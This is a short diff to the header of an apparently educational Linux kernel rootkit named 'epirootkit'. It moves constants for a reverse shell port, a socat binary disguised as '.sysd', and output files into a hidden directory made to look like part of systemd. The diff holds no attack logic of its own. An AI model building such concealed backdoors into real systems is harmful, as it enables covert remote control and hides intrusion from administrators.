@@ -26,17 +26,16 @@
 #define SERVER_PORT 4242
 #define REVERSE_SHELL_PORT 9001
 #define CONNEXION_MESSAGE "epirootkit: connexion established\n"
-#define STDOUT_FILE "/tmp/std.out"
-#define STDERR_FILE "/tmp/std.err"
-#define SOCAT_BINARY_PATH "/tmp/.sysd"
+#define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
+#define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
+#define STDOUT_FILE HIDDEN_DIR_PATH "/std.out"
+#define STDERR_FILE HIDDEN_DIR_PATH "/std.err"
+#define SOCAT_BINARY_PATH HIDDEN_DIR_PATH "/.sysd"
 
 #define MAX_MSG_SEND_OR_RECEIVE_ERROR 5
 #define TIMEOUT_BEFORE_RETRY 1000
 #define RCV_CMD_BUFFER_SIZE 1024
 #define STD_BUFFER_SIZE 1024
-
-#define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
-#define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
 
 // Module parameters
 extern char *ip;
